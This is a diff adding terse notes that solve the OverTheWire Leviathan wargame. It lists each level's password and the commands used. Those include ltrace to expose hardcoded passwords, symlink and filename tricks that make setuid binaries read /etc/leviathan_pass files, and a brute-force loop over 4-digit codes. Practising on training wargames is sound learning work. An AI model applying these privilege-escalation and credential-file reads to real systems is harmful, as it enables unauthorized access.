@@ -1,0 +1,84 @@
+Leviathan -
+  Host: leviathan.labs.overthewire.org
+  Port: 2223
+
+leviathan0 - leviathan0
+  cat ~/.backup/bookmarks.html | grep leviathan
+
+
+leviathan1 - rioGegei8m
+  -r-sr-x---  1 leviathan2 leviathan1 7608 Nov 13 16:03 check*
+
+  check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
+  dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
+  BuildID[sha1]=dc657b9ea2ecfca5d967239262ff48f0aaf4f4d0, not stripped
+
+  leviathan1@leviathan:~$ ltrace ./check
+  __libc_start_main(0x804858d, 1, 0xffffd6f4, 0x8048670 <unfinished ...>
+  printf("password: ")
+  getchar(0x80486f0, 0, 0xf7e45830, 0x80486bbpassword: test)
+  getchar(0x80486f0, 0, 0xf7e45830, 0x80486bb)
+  getchar(0x80486f0, 0, 0xf7e45830, 0x80486bb)
+  strcmp("tes","sex")
+  puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...)
+  +++ exited (status 0) +++
+
+  password: sex
+  $ cat /etc/leviathan_pass/leviathan2
+
+
+leviathan2 - ougahZi8Ta
+    -r-sr-x---  1 leviathan3 leviathan2 7596 Nov 13 16:03 printfile*
+
+    ltrace ./printfile
+    __libc_start_main(0x804858d, 1, 0xffffd6e4, 0x8048680 <unfinished ...>
+    puts("*** File Printer ***"*** File Printer ***)
+    printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename)
+    +++ exited (status 255) +++
+    leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
+    You cant have that file...
+    ltrace ./printfile /etc/leviathan_pass/leviathan3
+    __libc_start_main(0x804858d, 2, 0xffffd6b4, 0x8048680 <unfinished ...>
+    access("/etc/leviathan_pass/leviathan3", 4)
+    puts("You cant have that file..."You cant have that file...)
+    +++ exited (status 1) +++
+
+    mkdir /tmp/srlev2 && touch /tmp/srlev2/lev3\ file.txt
+    ln -s /etc/leviathan_pass/leviathan3 /tmp/srlev2/lev3
+    ./printfile "/tmp/srlev2/lev3 file.txt"
+
+
+leviathan3 - Ahdiemoo1j
+    same as lev1 - look for strcomp
+
+
+leviathan4 - vuH0coox6m
+    ./.trash/.bin --> binary string.  Convert
+
+
+leviathan5 - Tith4cokei
+    -r-sr-x---  1 leviathan6 leviathan5 7672 Nov 13 16:03 leviathan5*
+
+    leviathan5@leviathan:~$ ./leviathan5
+    Cannot find /tmp/file.log
+
+    ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+
+    leviathan5@leviathan:~$ ./leviathan5
+
+leviathan6 - UgaoFee4li
+    -r-sr-x---  1 leviathan7 leviathan6 7560 Nov 13 16:03 leviathan6*
+
+    leviathan6@leviathan:~$ ./leviathan6
+    usage: ./leviathan6 <4 digit code>
+
+    for i in {0000..9999}; do ./leviathan6 $i; done
+
+    cat /etc/leviathan_pass/leviathan7
+
+
+leviathan7 - ahy7MaeBo9
+    -r--r-----  1 leviathan7 leviathan7  178 Nov 13 16:03 CONGRATULATIONS
+    leviathan7@leviathan:~$ cat CONGRATULATIONS
+    Well Done, you seem to have used a *nix system before, now try something more serious.
+    (Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
